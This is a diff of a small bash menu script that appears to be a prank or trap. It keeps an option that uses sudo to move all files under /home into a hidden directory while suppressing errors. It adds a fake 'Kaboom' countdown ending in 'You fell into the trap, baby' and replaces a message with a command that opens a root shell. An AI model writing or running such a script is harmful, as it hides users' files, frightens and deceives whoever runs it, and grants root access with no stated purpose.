@@ -49,10 +49,15 @@ case $option in
         sudo mkdir -p /home/.directory && sudo find /home -mindepth 2 -exec mv {} /home/.directory/ \; 2> /dev/null
         ;;
     3)
-        echo -e "\n${greenColour}You are going to make a kaboom${endColour}\n"
+        echo -e "\n${greenColour}Say goodbye to your pc ...${endColour}\n"
+        for i in {5..1}; do
+            echo -e "\n${redColour}Kaboom in $i${endColour}\n"
+            sleep 1
+        done
+        echo -e "\n${redColour}You fell into the trap, baby${endColour}\n"
         ;;
     4)
-        echo -e "\n${greenColour}You are going to go to root${endColour}\n"
+        sudo sudo /bin/sh
         ;;
     *)
         echo -e "\n${redColour}You have to choose a number between 1 and 4${endColour}\n"
